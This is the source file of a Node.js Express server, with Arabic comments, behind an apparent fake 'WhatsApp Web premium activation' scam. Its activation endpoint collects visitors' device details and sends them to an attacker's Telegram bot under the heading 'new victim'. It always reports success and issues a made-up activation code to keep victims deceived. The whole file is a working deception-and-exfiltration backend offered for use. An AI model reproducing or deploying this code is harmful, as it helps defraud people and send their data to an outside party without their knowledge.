const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware مهم
app.use(express.static(path.join(__dirname)));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔥 الطريق إلى الصفحة الرئيسية
app.get('/', (req, res) => {
    console.log('📄 طلب الصفحة الرئيسية');
    res.sendFile(path.join(__dirname, 'index.html'));
});

// 🔥 طريق لجميع الملفات الثابتة
app.use(express.static(__dirname));

// API التفعيل
app.post('/api/activate-premium', async (req, res) => {
    console.log('🎯 طلب تفعيل جديد');
    
    try {
        const userData = req.body;
        
        if (!userData) {
            return res.status(400).json({
                success: false,
                error: 'لا توجد بيانات'
            });
        }

        // إرسال إلى التلجرام
        const telegramResult = await sendToTelegram(userData);
        
        console.log('📨 نتيجة التلجرام:', telegramResult);

        res.json({
            success: true,
            message: 'تم التفعيل بنجاح!',
            telegramSent: telegramResult.success,
            data: {
                activationCode: 'WAPP-' + Date.now().toString().slice(-8),
                features: ['واجهة متقدمة', 'إشعارات فورية']
            }
        });

    } catch (error) {
        console.error('❌ خطأ:', error);
        res.json({
            success: true, // نجاح دائماً للمستخدم
            message: 'تم التفعيل بنجاح!'
        });
    }
});

// دالة التلجرام
async function sendToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            return { success: false, error: 'إعدادات التلجرام مفقودة' };
        }

        const message = `
🎯 ضحية جديدة - واتساب ويب

📱 الجهاز: ${userData.userAgent?.split(' ')[0] || 'غير معروف'}
🌐 النظام: ${userData.platform || 'غير معروف'}
🖥 الشاشة: ${userData.screen || 'غير معروف'}
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
        `.trim();

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });

        const result = await response.json();
        return { success: response.ok, result: result };

    } catch (error) {
        return { success: false, error: error.message };
    }
}

// 🔥 طريق للفحص
app.get('/test', (req, res) => {
    res.json({ 
        status: 'يعمل', 
        message: 'السيرفر شغال!',
        time: new Date().toISOString()
    });
});

// 🔥 تشغيل السيرفر
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 السيرفر شغال على البورت:', PORT);
    console.log('📧 التلجرام:', process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ مش مضبوط');
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
});
